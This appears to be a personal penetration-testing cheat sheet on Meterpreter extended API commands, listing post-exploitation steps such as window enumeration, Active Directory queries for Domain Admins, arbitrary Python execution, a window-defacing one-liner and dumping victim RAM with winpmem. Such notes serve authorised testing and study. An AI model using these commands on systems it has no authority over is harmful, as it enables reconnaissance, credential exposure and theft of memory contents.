# 03 - ExtAPI

Search Tag(s): #metasploit-framework #command-and-control #interactive-shell

TODO: Provide usage examples

## 3.1 - Help Menu

```
meterpreter > load extapi
```

```
meterpreter > load powershell

Powershell Commands
===================

    Command                    Description
    -------                    -----------
    powershell_session_remove  Remove/clear a session (other than default)
```

```
meterpreter > load python

Python Commands
===============

    Command         Description
    -------         -----------
    python_execute  Execute a python command string
    python_import   Import/run a python file or module
    python_reset    Resets/restarts the Python interpreter
```

https://buffered.io/posts/3-months-of-meterpreter/

```
meterpreter > irb

>> client.extapi.window.enumerate.each {|w| client.railgun.user32.SetWindowTextA(w[:handle], "PWNED!")}
```

```
meterpreter > window_enum -h

Usage: window_enum [-h] [-p parent_window] [-u]

Enumerate the windows on the target.

Enumeration returns the Process ID and Window Handle for each window
found. The Window Handle can be used for further calls to window_enum
or the railgun API.

OPTIONS:

    -h        Help banner
    -p <opt>  Parent window handle, used to enumerate child windows
    -u        Include unknown/untitled windows in the result set

Note: Not all windows can be enumerated. An attempt to enumerate
      the children of such a window will result in a failure with the
      message "Operation failed: The parameter is incorrect."
```

```
meterpreter > window_enum

meterpreter > window_enum -p <parent_window>

meterpreter > window_enum -u
```

https://labs.withsecure.com/publications/active-directory-users-in-nested-groups-reconnaissance
https://www.darkoperator.com/blog/2014/1/29/enumeration-using-the-meterpreter-adsi-extended-api-commands

```
meterpreter > adsi_nested_group_user_enum [<subdomain>.]<domain>.<tld> "CN=Domain Admins,CN=Users,DC=demo,DC=mwr"
```

```
meterpreter > adsi_domain_query acmelab1 (&(objectCategory=person)(objectClass=user)

meterpreter > adsi_domain_query acmelab1 (objectclass=organizationalunit) name distinguishedname 
```

```
meterpreter > load winpmem

Winpmem Commands
================

    Command       Description
    -------       -----------
    dump_ram      Dump victim RAM
```

---
## References

### OJ's Perspective

- [OJ's Perspective: 3 Months of Meterpreter](https://buffered.io/posts/3-months-of-meterpreter/)